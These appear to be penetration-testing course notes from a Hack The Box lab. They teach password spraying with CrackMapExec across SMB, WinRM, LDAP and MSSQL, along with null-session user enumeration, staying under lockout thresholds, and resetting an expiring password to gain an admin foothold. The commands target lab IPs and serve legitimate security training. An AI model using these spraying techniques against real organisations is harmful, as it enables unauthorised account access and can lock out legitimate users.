## Password Spraying 

We found a list of users abusing the **NULL Session** flaw. We now need to find a valid password to gain a foothold in the domain. If we do not have a proper list of users, or the target is not vulnerable to a **NULL Session** attack, we will need another way to find valid usernames, like OSINT (i.e., hunting on LinkedIn), brute-forcing with a large username list and Kerbrute, physical recon, etc. In this section, we will learn how to find a valid set of credentials by testing authentication against a set of targets once we have a list of usernames. 


### Creating a Password List 


We do not know these users' passwords, but what we know is the password policy. We can build a custom wordlist of common passwords such as **Welcome1 and Password123**, the current month with the year at the end, the company name or the domain name, and apply different mutations. To learn more about password mutations, check out the Academy module [Password Attacks](https://academy.hackthebox.com/module/details/147/). Let's use the domain name as the password with a capital letter, a number, and an exclamation mark at the end: 



#### Password List & User List 


![Password Spraying](/Password-Spraying/images/user-pass-list.png) 

- Now we need to select the protocol and the target and use the option **-u to provide a username(s)** or file(s) containing usernames and the option **-p to provide the password(s)** or file(s) containing passwords. 
- Let's see some examples using the SMB protocol: 


1. Password Attack with a File with Usernames and a Single Password 
2. Password Attack with a List of Usernames and a Single Password
3. Password Attack with a List of Usernames and Two Passwords
4. Password Attack Continue on Success
5. Password Attack with a List of Usernames and a Password List

```

$ crackmapexec smb 10.129.204.177 -u users.txt -p Inlanefreight01! 

$ crackmapexec smb 10.129.204.177 -u noemi david grace carlos -p Inlanefreight01! 

$ crackmapexec smb 10.129.204.177 -u noemi david grace carlos -p Inlanefreight01! Inlanefreight02! 

$ crackmapexec smb 10.129.204.177 -u users.txt -p Inlanefreight01! Inlanefreight02! --continue-on-success 

$ crackmapexec smb 10.129.204.177 -u users.txt -p passwords.txt 


```


![Password Spraying](/Password-Spraying/images/spray.png) 

![Password Spraying](/Password-Spraying/images/spray-1.png) 

![Password Spraying](/Password-Spraying/images/spray-2.png) 


### Checking One user Equal to One Password with a Wordlist 


Another great feature of CME is if we know each user's password, and we want to test if they are still valid. For that purpose, use the **option --no-bruteforce.** This option will use the 1st user with the 1st password, the 2nd user with the 2nd password, and so on. 

- Disable Bruteforce 

![Password Spraying](/Password-Spraying/images/brute.png) 


### Testing Local Accounts 

- In case we would like to test a **local account instead of a domain account**, we can use the **--local-auth option** in CrackMapExec: 

#### Password Spraying Local Accounts 

`$ crackmapexec smb 10.129.204.177 -u Administrator -p Password@123 --local-auth `


![Password Spraying](/Password-Spraying/images/local.png) 


### Account Lockout 

- Be careful when performing Password Spraying. We need to ensure the value: **Account Lockout Threshold is set to None.** 
- If there is a value (usually 5), be careful with the number of attempts we try on each account and observe the window in which the counter is reset to 0 (typically 30 minutes). 
- Otherwise, there is a risk that we lock all accounts in the domain for 30 minutes or more (check the Locked Account Duration for how long this is). 
- Occasionally a domain password policy will be set to require an administrator to manually unlock accounts which could create an even bigger issue if we lock out one or more accounts with careless Password Spraying. 
- If you already have a user account, you can query its **Bad-Pwd-Count attribute**, which measures the number of times the user tried to log on to the account using an incorrect password. 


### Query Bad Password Count 

`$ crackmapexec smb 10.129.204.177 --users -u grace -p Inlanefreight01! `

![Password Spraying](/Password-Spraying/images/query.png) 

### Account Status


- Depending on the reason, for example, 
- **STATUS_INVALID_LOGON_HOURS or STATUS_INVALID_WORKSTATION** may be a good idea to try **another workstation or another time.** 
- In the case of the message **STATUS_PASSWORD_MUST_CHANGE**, we can change the user's password using [Impacket smbpasswd](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbpasswd.py) like: **smbpasswd -r domain -U user.** 


### Changing Password for an Account with Status PASSWORD_MUST_CHANGE 

```

$ crackmapexec smb 10.129.204.177 -u julio peter -p Inlanefreight01! 

$ smb -r 10.129.204.177 -U peter

Old SMB password:
New SMB password:Griffin3
Retype new SMB password:Griffin3

$ crackmapexec smb 10.129.204.177 -u peter -p Griffin3 

```

![Password Spraying](/Password-Spraying/images/change.png) 

![Password Spraying](/Password-Spraying/images/change-1.png) 


### WinRM - Password Spraying 

```

$ crackmapexec smb 10.129.204.177 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success 

$ crackmapexec winrm 10.127.204.177 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success 

```

![Password Spraying](/Password-Spraying/images/winrm.png) 

- After changing peter's password to #!SpacesNotTabs1 we can now sucessfully login via winrm. 

- We can execute commands on the system with the account Peter, who has local admin rights. We will cover more about this in the section [Command Execution](https://academy.hackthebox.com/module/84/section/812). 


### LDAP - Password Spraying 

- When doing Password Spraying against LDAP protocol, we need to use the FQDN otherwise, we will receive an error: 

#### Error when using the IP w LDAP 

- We have two options to solve this issue: configure our attack host to use the domain name server (DNS) or configure the KDC FQDN in our /etc/hosts file. Let's go with the second option and add the FQDN to our /etc/hosts file: 

![Password Spraying](/Password-Spraying/images/ldap-error.png) 

![Password Spraying](/Password-Spraying/images/head.png) 

![Password Spraying](/Password-Spraying/images/ldap.png) 


### MSSQL Authentication Mechanisms 

- We can have 3 types of users to authenticate to MSSQL. 

1. Active Directory Account
2. Local Windows Account
3. SQL Account 

- For an Active Directory account, we need to specify the domain name: 


### Password Spray - Active Directory Account 

```

$ crackmapexec mssql 10.129.85.177 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb 
$ crackmapexec mssql 10.129.78.7 -u julio grace -p Inlanefreight01! -d .
$ crackmapexec mssql 10.129.78.7 -u julio grace -p Inlanefreight01! --local-auth
$ crackmapexec smb 10.129.78.7 -u '' -p '' --users
$ crackmapexec mssql 10.129.78.7 -u newusers.txt -p newpasswords.txt --local-auth --continue-on-success

```

![Password Spraying](/Password-Spraying/images/ad.png) 

![Password Spraying](/Password-Spraying/images/mssql.png) 

![Password Spraying](/Password-Spraying/images/mssql-2.png) 
